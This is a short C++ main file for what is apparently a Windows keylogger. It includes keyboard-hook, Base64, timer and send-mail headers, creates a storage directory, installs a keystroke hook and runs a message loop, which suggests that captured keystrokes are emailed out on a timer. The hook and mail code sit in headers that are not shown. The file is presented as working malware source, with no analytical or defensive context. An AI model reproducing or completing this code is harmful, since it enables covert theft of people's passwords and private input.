#include<iostream>
#include<windows.h>
#include"Helper.h"
#include"KeyConstants.h"
#include"Base64.h"
#include"IO.h"
#include"Timer.h"
#include"SendMail.h"
#include"KeybHook.h"

int main(){
    MSG Msg;
    std::cout<<"LMAO!";
    IO::MKDir(IO::GetOurPath(true));
    InstallHook();
    while(GetMessage(&Msg, NULL, 0, 0)){
        TranslateMessage(&Msg);
        DispatchMessage(&Msg);
    }
    MailTimer.Stop();
    return 0;
}
